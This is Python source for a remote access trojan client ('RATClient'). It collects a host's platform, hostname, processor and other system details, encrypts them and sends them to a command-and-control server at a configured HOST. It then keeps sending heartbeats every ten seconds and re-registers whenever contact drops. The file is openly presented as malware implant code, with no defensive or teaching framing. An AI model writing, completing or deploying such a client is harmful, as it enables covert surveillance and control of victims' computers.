from click import decorators
import requests
import time
import platform
import uuid
import socket
from config import HOST, ENCRYPTION_KEY
from encryptor import Encryptor
from protocol import Protocol



class RATClient:
    def __init__(self):
        self.client_id = str(uuid.uuid4())
        self.server_url = HOST
        self.registered = False
        self.encryptor = Encryptor(ENCRYPTION_KEY)
        
    def get_system_info(self):
        try:
            hostname = socket.gethostname()
            return {
                "platform": platform.system(),
                "platform_version": platform.version(),
                "hostname": hostname,
                "architecture": platform.architecture()[0],
                "processor": platform.processor(),
                "username": platform.node(),
                "python_version": platform.python_version()
            }
        except Exception as e:
            print(f"[-] Error getting system info: {e}")
            return {"platform": "Unknown", "hostname": "Unknown"}
    
    def register(self):
        try:
            system_info = self.get_system_info()
            
            registration_msg = Protocol.create_register_message(
                client_id=self.client_id,
                system_info=system_info
            )

            encrypted_data = self.encryptor.encrypt(registration_msg)
            if not encrypted_data:
                return False
            
            print(f"[+] Attempting to register with C2 server...")
            
            response = requests.post(
                f"{self.server_url}/register",
                json={"data": encrypted_data},
                headers={'Content-Type': 'application/json'},
                timeout=10
            )
            
            if response.status_code == 200:
                response_data = response.json()
                decrypted_response = self.encryptor.decrypt(response_data.get('data'))

                if decrypted_response and decrypted_response.get('type') == 'success':
                    self.registered = True
                    print(f"[+] ✅ Successfully registered with C2 server!")
                    return True
            
            print(f"[-] ❌ Registration failed: {response.status_code}")
            return False
                

        except requests.exceptions.ConnectionError:
            print(f"[-] ❌ Cannot connect to C2 server at {self.server_url}")
            return False

        except Exception as e:
            print(f"[-] ❌ Registration error: {e}")
            return False
    
    def send_heartbeat(self):
        try:
            heartbeat_msg = Protocol.create_heartbeat_message(self.client_id)
            encrypted_data = self.encryptor.encrypt(heartbeat_msg)
            
            if not encrypted_data:
                return False


            response = requests.post(
                f"{self.server_url}/heartbeat",
                json={"data": encrypted_data},
                timeout=5
            )
            
            #return response.status_code == 200
            if response.status_code == 200:
                response_data = response.json()
                decrypted_res = self.encryptor.decrypt(response_data.get('data'))
                return decrypted_res and decrypted_res.get("type") == 'success'
            
            return False
            
        except Exception as e:
            return False
    
    def start(self):
        print(f"[+] C2 Server: {self.server_url}")
        
        #Initial registration
        if not self.register():
            print("[-] Initial registration failed, retrying in 30 seconds...")
            time.sleep(30)
            return self.start()
        


        heartbeat_count = 0
        while True:
            try:
                if heartbeat_count % 6 == 0:  #Every 60 seconds
                    print(f"[+] Heartbeat #{heartbeat_count} - Client active: {self.client_id}")
                
                if not self.send_heartbeat():
                    print("[-] Heartbeat failed, attempting re-registration...")
                    self.registered = False
                    self.register()
                
                heartbeat_count += 1
                time.sleep(10)  #Check every 10 seconds
                
            except KeyboardInterrupt:
                print("\n[!] Client stopped by user")
                break
            except Exception as e:
                print(f"[-] Error in main loop: {e}")
                time.sleep(30)

if __name__ == "__main__":
    client = RATClient()
    client.start()